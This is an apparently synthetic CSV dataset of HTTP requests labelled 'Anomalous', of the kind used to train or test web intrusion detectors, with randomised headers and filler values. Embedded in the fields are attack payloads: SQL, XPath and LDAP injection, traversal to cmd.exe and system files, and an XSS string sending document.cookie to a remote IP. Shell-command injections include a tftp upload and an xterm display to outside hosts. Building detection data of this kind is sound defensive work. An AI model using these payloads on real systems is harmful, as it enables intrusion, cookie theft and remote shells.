Class,Method,URI,Host-Header,Host,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Cookie,Pragma,User-Agent,Content-Length,Content-Type,POST-Data,GET-Query
Anomalous,GET,/n@XnqnFG2N/oo33nre4cctfnlsidr/Mnsp/rBZmkQh/3jtQ4s1WUlBxbin/mmu7TMsnmRIDuhditott/M-_aU4ZRJ.gif,HTTP/1.0,www.lnmchAanla.com,sdieR,"application/*, application/*;q=0.3","macintosh, koi8-r, x-mac-icelandic;q=0.9, cp-932","eie-sEEmgei;q=0.3, 5mr-sx06euj, idtcigno-8sojtT, hRRinehb-euAa;q=0.9",max-age=0,niEg4garrmtihf=hL3z7r;cy8Tfhl=iepunrgenc;kOoHrfutD=tZ3QP;bcenesRq=692180;xRAdoAEh=1w1tm;L6GkanE=8801064,e=dteai,nOuoahRedodsad,,,,eaL5l5seigdtri=LfallOngroup+by%29rOnr&icrdamai0tr4r=54&ssock_stream02wform=%3Cscript+%3Ealert+++%28aciaineoe.unru%29%3C%2Fscript++%3E&rmtmqcn=lus&PdX458tincludehttpsKWa=q&i4iGne=rnhA&ueranlAtmfmwur=te+xrs%29nn&cefClchwnhh=torcpeE&hxp_Dyprocessing-instruction9gJKV=tay
Anomalous,POST,/luQG2A/rnrt0ptAhwmZec/Bnetcatn4JeYvcXVSw4/crnctsb3adta4writ.shtml,HTTP/1.0,www.oteeb.cz,keep-alive,*/*;q=0.1,"euc-jp, utf-7, x-mac-arabic",*,min-fresh=6,dode6uqH=7r'     or    count(   path/child::node()[position(  )=((    i   + j+  k   +  l    +  1)]  | path/child::*()[position()=(k+1)])=1  or  'ee5icdhe'    = '    dm'  or;FCpOI=77401726;Z9Yt=iFLoVHsF;enqm=TSo0cO9oc6,no-cache,Mozilla/1.8 (Windows; U; Win 9x 3.4; 42-ot; rv:5.0.8) Gecko/24574997,71,application/x-www-form-urlencoded,g9PEXY3=66425&NdNgiTnvssr=tDH1F-&eewt84eIey=R juu~CcdqstdincH&tb=eMji,
Anomalous,GET,/lu80pSBbd7eJ/fdKWMsvbodyxlogx/bL.jpeg,HTTP/1.0,www.ade7aGkt.gov:80,jprsqf,*/*;q=0.9,*,*;q=0.6,no-store,uhtpRHir=yswi]isr;iAsz9iBotptniwe=1eucfo9gitia;EWosi3ny6nZ=e7-E6Ztckz;noHh7cb8ctqa=58889;uttm8iihO=icTV1H,no-cache,dornczse (qF.SpjH),,,,SaJQ=9550636&LAtj=e%29ut&swnfor816v=%27+++union+select+++++%40%40version%2C1%2C1%2C1--&gIes0nit=5tts0d+i9gchoq%7C&i3nw=3140
Anomalous,GET,/vtn/3N8cmdchbKnrx/ezEtuiu3Bda4/rpotfaa6/iO0rbme9BJY_/sm1vjWlv/LzLmXEkn1toh/aKQ@.jpg,HTTP/1.0,73.140.218.27,close,*/*,cp-936;q=0.4,*;q=0.0,no-transform,ettsealtd7ire= hrq;iperlbp1b.=ecaH0,ethitl='se1lbtU',Mozilla/4.1 (X11; U; SunOS sun4u 6.6; ai-hd; rv:4.7.2) Gecko/55847472,,,,pbodyf.HYhQ0JC=ehdiframeq7ph%2Fort%25ub+xKwnfi&eadyvmei=10134628&3e=ghIr&slo=509594892&patoleDa=formnzaeb%2B&ncits=OR+++++%27ud%27++BETWEEN++%27R%27++AND+%27T%27
Anomalous,PUT,/uy/UEGaccess_logzVexec4mq0QPiframe0/CLFqposition/eeaElxi.tiff,HTTP/1.0,www.Tse0a.ch,keep-alive,"video/mpeg, application/*;q=0.8","iso-8859-1;q=0.7, cp-936;q=0.3, windows-874, koi8-r, koi8-r",*;q=0.0,min-fresh=24,ogeee=566;evnl2utlroi=h9auauot36fd;fiv=niteethconnectqSefeto4gsystem1,no-cache,ncgr1ALesdem,240,application/x-www-form-urlencoded,lneml=eo4n' or   (i  <   count(rtMts9/child::text())   and    j     <   count(xnoe/child::comment())   and k  < count(pe/child::*)     )    or     'ueiniS'    = '     toeSeail'  or,
Anomalous,GET,/thJxSatmHaogki2Cl7/0A0y/fCy7VM4o10xgmkl0Ml1k/s4ND/Eae3U5ATogefuIn6h2se/hUDhdshlfj5v0deWgHh/4lzxJ5rYk@TwP/30CbetweenTobjectetch3K6se2/69XFRX6l-GC8V18DJ.asp,HTTP/1.0,137.39.108.73,close,"image/gif;q=0.8, application/postscript;q=0.1",*,*;q=0.2,no-transform,rgsehrtnl3EaR=375728;yhea=j vls2apshsnullNformc;tnUeN3ednErtN=be.;epiof=8Ae,no-cache,N8iheiyta,,,,oztigcKiff=%29h+r%27&aa5Snotn9=9327&ai7weststscYteo=91589&@0aZp=759818&tp=%27+++%2F**%2F+++++OR+++%2F**%2F%27%27++%3D++%27&aeodOihlear6plr=execwp-y+2lnru8QHsoia&nimsneeKOciiwtn=1&4dCel2X=491568022&rzhEmtjbh=11
Anomalous,GET,/e7Cey50xlths/ARJ_/exRflwz9r16dXtJv/OrB1winntinputr/eH13/61QZaTlKeweoX.SHha.html,HTTP/1.0,95.244.8.34,te5sYd8d,"text/*;q=0.2, video/quicktime;q=0.6",*;q=0.2,"vleaivto-In, hgr-l;q=0.8, oO-2h5, t3-clhDsERl;q=0.4",max-age=1,csee2hyes5oe1e=aipTSl;eerme=vVeB_Qlo;Gyformupdate6e4Q2.=tropenntae  %,no-cache,Mozilla/7.5 (X11; U; Linux i386 7.5; tr-s4; rv:5.3.9) Gecko/45998622,,,,ivC8=9t&rKn=%28i+%3C++count%28er%2Fchild%3A%3Atext%28%29%29+++and++++j+%3C++++count%28byoy%2Fchild%3A%3Acomment%28%29%29+++++and++k+++++%3C++count%28d6it%2Fchild%3A%3A*%29++%29
Anomalous,PUT,/dUZmeVxNA--qUb8OinR/gedm.htm,HTTP/1.1,158.86.138.163,keep-alive,*/*;q=0.9,"euc-kr, iso-8859-4","nmaet6-5a;q=0.3, 0E-D, dhhns-rnem, bpQ-htht;q=0.6, er-m",min-fresh=5093,,1rotl=arTU,RLa1ewol5Snext,221,application/x-www-form-urlencoded,aIBipa6nfu=t:&1sqnr=45753610&So5d8IGnMV=4&ee=02&eeteo8nato=la4uMbmrmSi2hn&ltpr=0&i5sdCaiearseeid=n4Q4-FaknN&cpoue= Qn&4a5sonheeafrxep=tqsdo&j5m=IkNln)( |(ae=*)&bgsound3hM=8i7f;saronsaeh&ll=0&9i@DeUeN=71344,
Anomalous,GET,/iehzrj3Lebaea/nK/Cdabaehx/ii1hbao/6-betweenG6zphp4BAbodyht.bin,HTTP/1.1,www.j3UErxUn8.net,igglUh,*/*;q=0.8,"windows-874, iso-8859-2;q=0.6, x-mac-cyrillic","bjRaikwl-6mmp;q=0.3, ltYErca-Tttaa;q=0.3, nsasfke-eeoti;q=0.4, en3-nObrut;q=0.6, t-lcptneD",max-age=52941,gnewsaljo8hvp=dtstThN8jceNiz;Coile=0875961;iisiyu1o4Doal=e;8ne2=e|y3tobjectjphp at>hspe;yitO3ddeen8et3=d4e,no-cache,Mozilla/0.0 (Windows; U; WinNT 8.7; hl-46; rv:5.8.7) Gecko/84331549,,,,hr2x9iersotoas=4809691&ngeDyiiite=htaccesltut%29%3D6%27&u2dhk4skainno6g=+wgetWso7nul9r%5Besl&PaRNUwgetfFs9Pr=nZp2&pSe=27&seomonjsaeTtod=8450&a8aTxaD=E1zgnro&T1iou=ltsecnsh&eslnR6h=227684&SodOqh8ieneNnei=A6%3Deeui&eokSio=SM&aIrs=sadEr6t&Diiqltestesm=txv7tUKF7IJY&Ivltthhht33a=..%2F..%2F..%2F..%2Fvar%2Flog%2Faccess_log%2500.html&sanrserqne=akdte
Anomalous,GET,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe,HTTP/1.0,www.lzqu.cz,close,*/*;q=0.4,*,*;q=0.2,min-fresh=1,ei0seIzt=95766546;lrSv=6458,Eiilnn='tisHs',Mozilla/3.3 (Machintosh; U; PPC 6.9; oE-ts; rv:8.2.7) Gecko/03758303,,,,/c+dir
Anomalous,GET,/lsneortIafim1bterymr.aspx,HTTP/1.0,159.124.167.254:888,oh1earj,*/*;q=0.2,*,*,no-cache,Vg-mEnS.Rftp=eyo$itacQftpug;eSllHtibAmea=lAMm3Iv3fgC;bmoenes6Ayst2=|6s~/,no-cache,Mozilla/2.7 (compatible; Konqueror/5.5; SunOS sun4u; d6zi),,,,5epheta=aiT7%2FnaocTt&ubltlue4od5h=55%29%28%26%28objectClass%3Di9o%29%28%7C%28sn+++%3D+++ie%29%28cn%3Du+++J*%29%29&kaatTdxud=child%3C&aehS9ys=aqe%2Be&RRWllocationDwinnt=tleo
Anomalous,GET,/eWU3N4/af7.ja8c0Qu/eAy0@hrPeS2Q@/tarJZrEq0YxWEVMW3/Sdas/mH8ZUKOgV/aUtw.css,HTTP/1.0,www.tqwusaean.fr,close,*/*;q=0.8,*;q=0.5,*,wyaridy=ire,Lsten9AaTR=brtdrf,no-cache,Seetth8rbB,,,,aa5vhwe4OiyeG=nriotoew%27+++++or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or++++%27lq%27++%3D%27
Anomalous,POST,/Eaesa9nifc7qseIe/wIam/ryLqj9sRK/ut/oDuCrR/erWut4/bsduqIpOrrnmogtse1di/select1/iroaDnesrdn/FMG1dP6Y5DZE1/thjLE_Ii7rqUCIB_ArHT.php4,HTTP/1.0,www.uaunuHe.cz,close,"application/zip;q=0.6, audio/basic;q=0.2","koi8-r;q=0.3, euc-tw;q=0.8, windows-1252;q=0.3, x-mac-hebrew;q=0.9, x-mac-greek;q=0.2","e-gnoion;q=0.3, sfhs3ohg-rGoaae;q=0.1, a7tN-eb",max-age=87,rm9djuteoeatt=nAnr3xc;iih65rwyttTy=7ttrr|;ewgr=79873673;utmoimixr6dC6ts=r 3x;gtrSlyg=axvJH;idEa7Ia5dsaek=1830638,la=nkeDl,t5I1ac8 http://www.ae3eNmrf.biz,260,application/x-www-form-urlencoded,vkDdngogths6uT=2652838&ss=ohhroinputee$&to&itNe20=6rhtpass&r0midruesi=2eawiUUPEnI&gealtEe=ees;phttpsytoEeel e&egnW=qwer'  or Be2a0_v.Account='iunsila@meS.com&cdpmEonvQ=6805&81veip34qTAwe=tf&29Yw=oa|&mpM_passwd=psnsihsercprmj&tro=T>0ao node(,
Anomalous,GET,/iMvQn/oU2xqXNIAlMqq2UJM/eRe-t@wPD2/5r7Xbo_.php,HTTP/1.0,www.tIfrsnSeit.com,close,"text/*;q=0.5, audio/basic",*,*;q=0.8,no-store,cByY=9;etpFenqaPadn=Ke2tlDHi;lhog=3509968;ane6yua=t08wQ,no-cache,nei9drh2n (zsLWiqTl2; z.irr0sQ; fL0tSY; rXH-BD.; ipIk1OvM6),,,,3r6O8XGlWQ@=sOsOKS4&1txImP=ukEmsiyaad&catJQvKtLP=0515269903&l1e=ho+n&etytnarsoid=gnB-c&seeAepyh3mhoik=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fentere%2Fteninaalar%2Fonilat%2Fit.mspx
Anomalous,GET,/1aee/sjL5OPlASu_zqPrE8gB/o5cnoo/4pY9mtservicesetcMG3img-/ehTIltwAnhwte8naq/aUk-4MOfpB/t2l.pl,HTTP/1.0,www.hpch.biz:80,close,"text/html;q=0.1, text/*, video/*;q=0.1","koi8-r, x-mac-arabic;q=0.5",AauhhM-r9wi2;q=0.7,lsr=fsstEn,mEd=42;olhjtaZrNheifce= s+h3ntmpetebetweenTwt=;nwoesIAeyndieti=taw3 ur;W5eF7ZkWYO=3;nsi=1bi]R lh,no-cache,eriE/0.0.2.0,,,,waiardpaeeO7pt=select+79rnbH+from+ALL_USERS&lor8aviTdtf9n=41&IfI9XgO=t5inHna%3Fd8pr
Anomalous,GET,/nkwuo6DFvoK.t/ust/gcuhierAclm/foo2aimhxrsEeoaetnrh/k9select/sanRd/hvjj76Eh0w/eC1odeb/bic/Ondstaf.png,HTTP/1.0,251.136.10.2,close,"video/*;q=0.5, text/*;q=0.5, image/*",*;q=0.1,"ids-eeeO1d;q=0.0, iral-Ma9shE;q=0.9",no-cache,ewn=we;26edjmS=57692;ur8neiaeiodtzw=rformhg 8lebt9aiym,e=ale,ajxlGWuU2 http://www.idme.com,,,,lItao3sSakdplo=nicrpoOsaas&XIt4-=vyaCa&st09etailrwqsew=2&TnbW-klQ1echo=ee9miHoidur&zz=uQx7u54KIJK&cbadAaiastes=mail++dts4egf8%40oiE.itsl.gov+++++%3C%3C+++++%2Ftmp%2Fwu.c+%3B&ros=sgwm&Nsrat3rkEnantle=oGIsonti&ecSh=0&euqfnthAvycLiir=2trlsesnhe
Anomalous,GET,/ie2KQtt7@h/diar/13HKohx/tem/bZeZxxpoCVyUHWcWQa..aspx,HTTP/1.0,www.aEg3ho.cz,close,"application/*, audio/basic",*,*;q=0.7,no-store,3tj=emceog1zIrqaiieyya;ah=t?gn\\eciinonmbustdinc;aAe6r2d8i=mxt,,Mozilla/4.3 (X11; U; Solaris 0.1; 1y-va; rv:1.4.7) Gecko/09945344,,,,tctqoo=666&o7DE9=4&gNbgsoundLgxmyeV=sd&aiIonwhsnxtd=158.49.25.209++%7C+++++tftp++-i+++++120.153.122.107++++PUT+sam._&rsfbywehear=hSctoTf2ic&b0HT=aWrhh%28eboot.ini%24npjl&5neiawdihoesos=ttsj3z&tmrpjqwwnt=gtiOCB&fr=f%7Ereii&Ah67o1ix0t0Hor=xCpF0lSRQt79&rcpWnqdXCOt7=tnerd1aos0t9eake
Anomalous,GET,/Nsm6vRhtddeizn/ei4xboin7c9elem1eb/87ziiaoeoe7Ao36j/txtel/TopoiU9aiillbcgeoerl/iaeefhau/mrhzTTn2l/eT0_ErRv.yhm/WUMDnz7ZvhiK/herls0doTeT5dpgtcf.nsf,HTTP/1.0,202.151.250.131,keep-alive,text/*,"iso-2022-jp;q=0.6, iso-8859-5;q=0.9",*,only-if-cached,uy=r2vIA;frdth=em;yLVbmmail07=6;c5bzb@httpo7=wdtfIAswonrdsdnace;7hdnsm=je0;@NconnectExBF=KooiaLh,pes='Jgt1rt',Mozilla/5.3 (X11; U; Open BSD i386 0.6; fo-ia; rv:2.4.5) Gecko/45249571,,,,ylziAosmEnw=%28hl&aWRafdA7a0=ingiikhdd5&iuiog3IL=..%2F..%2F..%2F..%2Fvar%2Flog%2Faccess_log%2500.html&uiRcariHteess=nipdartttCUrls
Anomalous,GET,/IuuysesyalsO7/Fwhere/eLlSM/ST3obmtu3onvtoo/c31ta6OKBIef_X8U/ooq@Jgt-NyGa/UGtRXbUJTH1/iYU@cUJXvQR2n.o/a5nmB-oqihdI3EFn/eurtneicectty/Stenaest.html,HTTP/1.1,www.e5oftt.uk,tiet,"audio/*;q=0.3, application/*",euc-cn,"oeIuesn-sthuks5t, 7nnn-97rams;q=0.3, Fuong-nqofs8tH, nn-hpkhtya;q=0.6",eneEehaq=Scidrwv,l0ysttdtsneOyoe=tquPwP,hasrLrae='nr6',,,,,IT_xg=wdusIeutt&e2q=395&JWkO4MDRcnull2=aUmeteyfcd%5C&coainasrOrsfr7=0i%29&thuinsOtIrsed=t&skatR=nA3vqhPhB&ahpinciuuuek6e=62809936&ieFc=Eondrn4pae1nNtKe&TxacfHkna=51&opdediihtts4b=Ag0tc&datwgoser=lSi&oHAxmlzse7UxM=qfztv&uKn8JOjv.Ic=129719&4a2wrSn7eerppi2=ah%27%5D+++%7C+++P+++%7C++%2F%2Fuser%5B+++++name%2Ftext%28++++%29+++%3D++++%27af&1rkx3Fx9SNVO=0065922223
Anomalous,GET,/QoDal9/vBJXz6Qj5yl/n5Wm94/xPVM/zOefectufu19we/hbjsicoOtaes.cgi,HTTP/1.1,67.218.41.218,close,"audio/basic;q=0.6, audio/basic","iso-8859-2, koi8;q=0.6, windows-1257;q=0.4, x-mac-roman, shift_jis",*,hnohir1='tr',iOs5G9=62936763;In1ps=2,no-cache,y9ies/2.1,,,,ysidh=fh&T7HAsfi=ttiolibpasswd%26i&tV2-=th%5Dtjt&enge2d=0&ffm=%29++%28++++%7C+%28++++cn%3D*o+++%27brien*+++%29%28mail+++%3D*o++++%27brien*++%29++++&nlmuoyelf4inOa=9hnyiEwertjlts&btmhcc=eicsrxeNohS5aersnt
Anomalous,GET,/sodeciOvkCnJU/lsVZy@dZunion6yh/wrcotscjorsrJefas4e/f_a2-jHXLQ@32/HX1sNpWGM/trteranweHthb/ehzi/iuhaabfjqdk/hcooeurdi5ybsrh4w/aeL5xW/hodnuh8rraos1/sfrlnzIafDXerIslptat.exe,HTTP/1.0,129.63.44.226:80,keep-alive,*/*;q=0.3,*,*;q=0.7,no-cache,hyie1eo8leaOepu=612368;.6Vp1rSP4itH=epi\\koouth,no=rcrt,Mozilla/0.7 (Windows; U; Windows NT 7.9; at-oy; rv:2.6.4) Gecko/50410702,,,,ead4eE=8&srp=..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&usr35Emetaz=ga&tfPAnnyrnsertt=5375&nzWNUKJB=9&dhtapFMfie=737466&x7oiielykp4c=hdropqhoL&tabrzeo4=a3kNZ_&sb395uthfsc=ttR3wjrTou&gr5Namerm=701656764&MZn-x7FX=meaf1n6y9zaH&POiPS7=48
Anomalous,GET,/eAeOTh6ndioedasd/PaR8S/y1Sou@-oSllUfv5LC5wZ/vC/-W-execGIC/NUVV6_x6eUCZ-/hRZyYc-4UXJ@MnaRoZj/0tFqP6JZCZKDkj/au0QWqwX4os.LzIhLtVC/tZ4caZ21jBdite7g/eul3Lq@_0.htm,HTTP/1.1,www.rlzht.ch:80,onAar0,"application/*, image/gif;q=0.5, audio/basic","x-mac-arabic, iso-8859-1, iso-8859-8;q=0.7","ese-noF, aiydyi6k-iE8Grlz, dl3sUadv-t5;q=0.7, Afswa3-rbtes",lf=w,nrn3eudhEDhcmkO=rOd;pySnfoa6sq=63609587,tmsnhT9o='ensetty',Mozilla/6.3 (X11; U; Open BSD i386 7.6; ot-ab; rv:8.1.4) Gecko/51685287,,,,m1LtfngTy=st4yo%5DnisOsftp+tk&wo=+lEThdocumenth&wnaihpatfige3se=5Esa4weo&ebh=+s1eNo7yis5atb%2F%26i7&ettrus=wmz+xmlh9a%5Ds9-+nphp&qstdinFGS6=56&talesp=icftoviG&odc5Khrhoo=3&PoP1formS4KxZftptmp=tlaefnbia8&te7=hgvEengN+5n%3FfselectkD&uarpao3=151906996&a5utnwe=izYt&LEJST44ypFzO=obsoss5
Anomalous,GET,/m7GMwwAm4NQI3r/CTdocumentdm/oFjtO21xZ/tCkEXIdG8px/sgunw/ljZNylguEV5Yw6uW/uDE10JnfZfRuK/ccn/16sl/n67rsedm3tnn9/chwfnlwen.jpeg,HTTP/1.1,www.0hlt.ch,close,*/*;q=0.8,,u0-eefdEn,,,,Mozilla/5.5 (Windows; U; WinNT 9.3; nn-cL; rv:4.6.7) Gecko/34323414,,,,ta1e=%3C%21--++++%23include++virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22+--%3E&kqni=840634&hetDxAtsd6s8cDa=Eied&htud03slnwag7=45heofanLr&nagnn=764
Anomalous,PUT,/o.Cx/rV3pvCzMDZtU/5yhwmndn0ott/6ToZDkZbody._J/25umW/FkekArU/erx/yJUp/O6xFU7BeHs/vpHsNOn71H3Vy63.nsf,HTTP/1.1,125.76.191.5:0951,close,"image/gif, audio/basic, video/*",*,"e-rbzick, tlwdst-own5tsvo;q=0.1, O-5set, ai-g3teilb, lttjeot-noe;q=0.3",no-store,nsndfebcapi=01517941;RQI.=nhicognnsa,lg5=n,cc5at1qas,412,application/x-www-form-urlencoded,"ojs2lNa=rfx&rNg0processing-instructionxePEOqN=';    insert     into     wtapsuT5  values(666,'lmEdobu','aeered',0xfffff)&kOehel0dtelernm=sTteooreeq&wtej=b?o&lioWtow=r1Ud&ntazsa7lHoasKc4=txe2cdMusAg&8DVE@kzieIps=mguseT&neo5neysi5py= 4Zw&DskefdetStreo=EHausbnetcatt6&dsseu=80951&cdguso=shodunion e4qcmhesy&wlshmguotrilut=wsperlzL5vreplaceate-i&mapE=eispyinclude e&leIwu4dsyflSdet=deihtacces",
Anomalous,GET,/qQjl/riertt1tR/Vaou/23@0lh6gC47Tzbs/etzV/hrhUez2Z3JdjSc_/ek4_IZnwy/hEdWrUPmQa.ic@fG4Mm/N9V-uexeclSbgsoundA/sedsreEwbbetaela.jsp,HTTP/1.0,www.wmtonelRem.ch,S1cndrtm,audio/x-wav,*,*;q=0.1,Gel=9l,hacsar8qmpmtt=or<uT$mphp6j+li&tma;sqs=03234472;aAn4t5c5tr=shdno,wnie='tiat',Mozilla/5.3 (compatible; Konqueror/9.8; Linux i586; lbaaYtmnh2; 11Locnrvb; ozuvh0reS),,,,dsrElus4=r6%28eogyo&2nfQ0=%40ma5telnet&k0cpell=6&s1_nq40YUD8R=hDt&ouootoc=8457077344&vn=3&nicEpttv=lp&hp5uusrwz8=0iejsr%3CIchildKh%7Eoa+&di=..........................WINNTsystem.ini&E_lL.admin=RrobR4gr&elpeje0=o9Txat9c&UuSEh=43796218
Anomalous,GET,/uunPfsaoabsthN/msotl/aKrzdvbMRZiCF/CZIyv.TOapi/-THPPhtacces2.dFEw.tiff,HTTP/1.0,www.tra6dcwl.net:2957,rfdcruS,*/*,*;q=0.3,"rx-zxag, RfXed8l-nn, tw-eleosps, saesdb-eeN, nns-Io",no-store,.-wayEeJJN=ue;Pdjithc=inethprtbodyatK ot6eo;zlasjxtrsi=r;vttlw=lpassthruo;3Waccept6PWD0UzL= cei ti;nd3ebhkddDsa=ea=services<t(,no-cache,Mozilla/8.5 (Machintosh; U; PPC 2.9; 1n-ke; rv:8.6.9) Gecko/47618397,,,,qgt64sseiydlt=34642&aIJ=eeaeu&eTeeneuaoeeomt=%3FMi%24&drtakyoleme=onrotasanfk&auoraahtHhGseHi=copyhtzi+p9a-&aegD=%3Cimg+++++src+%3D+%22+++javascript%3A%5Bwindow.open%28%27http%3A%2F%2F42.150.211.145%2Fie.aspx%27%2Bdocument.cookie%29%3B%5D+++%22+++%3E&hE=8h&g5swxs6nta9akm=es%40N%40Bm&cr6tHe=tplTao715&s1pt=htecm9oBgB&erijeutsep86=80&9cfnha=grTvvW&gIlsEmgngDl=divhdc
Anomalous,GET,/Avfrh7Wd2wTjsP/a@y/dicNIbecsfeiuasrSrs/rua4ohmtl6/enV59OCr0a72VZY6ih@/eqLZpspN3B2OJM./nXdIra8r_DRhv/tmpwbkT/iiiittlbntng/GFHv7s.php3,HTTP/1.1,172.236.226.20,oilm,*/*;q=0.2,"euc-tw, windows-1251, cp-932",*;q=0.0,no-transform,n0icedpnNau=883;rmmehavingPJ5Ngroup by=etjhgdA,no-cache,Mozilla/4.2 (compatible; MSIE 7.2; Linux i586; ezEln2ahm; oOrek; ihLd),,,,A@0mnTpUA=a_2A&igsrnQnoeyhe=%27AY&ho=mhavingm+N&oeeu=aaSziei&acjnste=30&sj=pSGMVTXm&qgnellomh=asre8%29awms&eW5t9uaejgt=%3C%21--%23echo+var%3D%22date_gmt%22--%3E
Anomalous,GET,/.%u002e/.%u002e/winnt/system32/cmd.exe,HTTP/1.1,124.110.92.136:80,adfaat58,text/html,"windows-1258;q=0.3, iso-8859-7;q=0.7, windows-1258;q=0.3, cp-936",*;q=0.9,no-transform,gweadrIstev=omtarinf ce;a7=sdnj;ahtwmhboaoo=oMJK.,no-cache,Mozilla/7.2 (Machintosh; U; PPC Mac OS X 8.5; dA-do; rv:3.1.6) Gecko/14865478,,,,/c+dir
Anomalous,PUT,/rAQI54g-/o.wEWWQLPBmfyT8hEc_/tngsa7vh6rywoonoe/7winntlLK-xtermnBbgsound@mocha2/n0band/wshutdownxPCRT9fIeXq3k/9EHta7tpn3gtjeeniW.html,HTTP/1.0,79.71.152.163,close,"audio/*, text/*;q=0.3","windows-1255;q=0.9, x-mac-arabic, iso-2022-kr;q=0.0, euc-jp","ars-bZa;q=0.5, cobeeoa-loloRai, 9on9rn0-J;q=0.7",no-cache,ySdslashnn0h=eoLUs;e4oayecnthkuswe=0398;2wwa=6215565,no-cache,eAt4BUeF7V http://www.nhoe.it,145,application/x-www-form-urlencoded,tSinapnn=7258258&pmf=oreo&pUuMD3Wprocessing-instruction7Q=0r&dnwn=hua6ommEciesIebt&fE3rze=sZ5dFY7plR4&aqfbtats=erz)(    |   (ila0n=*),
Anomalous,GET,/ef8tdTaFiahitp7rc/eYNnirscY3l/vF/amZw9dy-dx/aia8hw4pn.r1P8k/gu7tldne/nmo6mrhblifu5teD/hnlornon/tapss5pz8DHeui5R/mrSVaVDXSBKZ/rdeojRefaEc3rh8rpviq/grUg.dll,HTTP/1.1,www.akocibnbli.com,keep-alive,*/*,*;q=0.4,"rgm-irnhety;q=0.2, tTaro5o-krRnsnm;q=0.6",no-cache,Ins=7,Eilb=e,oXvfH3y http://www.dsae.cz,,,,VAClPgX.Jnn=3333067&rwXr=%5Cn+uftp+++++-p+++++www.itterinanere.com+%2Fng%2Fetns%2Fchisme%2Fatasta%2Folenma%2Fnela&ulooquutfucs=medeletevM%27ncRccaeboot.initf+vi&tThltsxdhSun=dm3arsdnei6yrtn&qufut9Ltrs=wraF5na+o&ueoaoa6tlettno=dsa%289divedn60&exsnatoutos=3081764&eey7eieqa2tO=rcz_&naeeAiaOp3plws=m4I
Anomalous,GET,/tuiOer8nasroc16wnlor/ocvIq8T20i.BC8V/cz8gr_1Rprocessing-instructionexecd/tu8o7uessRhi2/dus-ET0Zvf5lriiPAb9.jpeg,HTTP/1.0,www.laenryrgs.cz,close,"audio/*, video/*;q=0.1","x-mac-roman;q=0.0, hz-gb-2312;q=0.9",tN-hq8;q=0.6,ueoaitH=uents,miiu1ealeehl=rFrecrp;afi=cchildi77ili;nPolBhS=e9sAhr;Ireplace-WgxmlhttpF_=82068;iheos=ot ;GSdJnevalsc=nSal,s='ecco',Mozilla/6.9 (Windows; U; Win 9x 2.8; 0N-o5; rv:1.4.2) Gecko/86958080,,,,yalclorooo=%29++++%28+++%7C%285b%3DRe3n*%29
Anomalous,GET,/lvbscriptyeFRpH/meodtSeea/evW0cZza51F@ITl6d1Uy/l-i4/uJ3USTPcGK5F/uaq1paba.jsp,HTTP/1.0,www.eoieht9.st:149,close,*/*;q=0.2,*;q=0.4,*;q=0.4,u='mqwx',HP6@xkZ=4754;UhiGC=bhpea utxy;SacsD7aaeumLiy5=nQV.gBZ;ed9gneyidsn=15525,o='arb',teEhTnt4n/4.1.1.0,,,,ay=233&7b9etth=%7EgDl&aeyc3ohAreti=0E%3A&weo6echtfnH=bMqip2P_VB_&e7sianhniosa5=%5Cr+++++xterm++-display+++97.188.139.179%3A0.0
Anomalous,POST,/zWZZQr/mPK6BPULV6F/dN1tont9sbeoiN/tanJMPBx/awawihtmeoR/yla/hsrwenseosuniosolR/e_UFnfUS/72YcU7noiIgEI-XU5/at/9h2.aspx,HTTP/1.0,www.hlsszruoaa.uk,GIu97,"text/*;q=0.5, image/*;q=0.7","utf-8;q=0.1, windows-1250, x-mac-icelandic;q=0.7",*,no-transform,raDitltr=3455;2lr=muald;AelEta=661;geoosiysel=532372;admin.uTT2=Le e7i >eT7<mew,rU='6tge',p5FFB-nXwH http://www.dynexA.org,292,application/x-www-form-urlencoded,wSdadetemnnPdl=Ol1e2&lmeiaaOhe1Mwleh=14430&apodCcal=lrhtife@hr &1XDrET=r5t9y&eaknhtd=enWMqv&i2qatoIuPeAhGns=9&tm9E1llwe=kTwsesdtjafo&fuu6inlideety=888219978&6ilE=s mprocessing-instructionss%a)na&ueie=ottta)(&(objectClass   =    o6*)&SXbbK=3&ew99rimaha=ntvar%lopa&Isge=1672,
